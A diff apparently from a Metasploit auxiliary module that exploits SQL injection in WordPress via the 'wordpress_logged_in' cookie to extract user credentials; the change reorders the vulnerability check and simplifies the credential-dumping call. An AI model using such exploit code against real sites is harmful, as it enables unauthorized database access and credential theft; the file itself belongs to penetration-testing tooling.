@@ -47,7 +47,7 @@ class MetasploitModule < Msf::Auxiliary
     ]
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     print_status("Performing SQL injection via the 'wordpress_logged_in' cookie...")
 
     random_number = Rex::Text.rand_text_numeric(4..8)
@@ -63,15 +63,10 @@ class MetasploitModule < Msf::Auxiliary
       fail_with Failure::Unreachable, 'Connection failed' unless res
     end
 
+    fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.') unless @sqli.test_vulnerable
+    print_good('Target is vulnerable to SQLi!')
+
     wordpress_sqli_initialize(@sqli)
-
-    return print_bad("#{peer} - Testing of SQLi failed. If this is time-based, try increasing the SqliDelay.") unless @sqli.test_vulnerable
-
-    table_prefix = wordpress_sqli_identify_table_prefix
-    unless table_prefix
-      fail_with(Failure::NotFound, 'Failed to identify the WordPress table prefix.')
-    end
-
-    wordpress_sqli_get_users_credentials(table_prefix, ip, datastore['COUNT'])
+    wordpress_sqli_get_users_credentials(datastore['COUNT'])
   end
 end
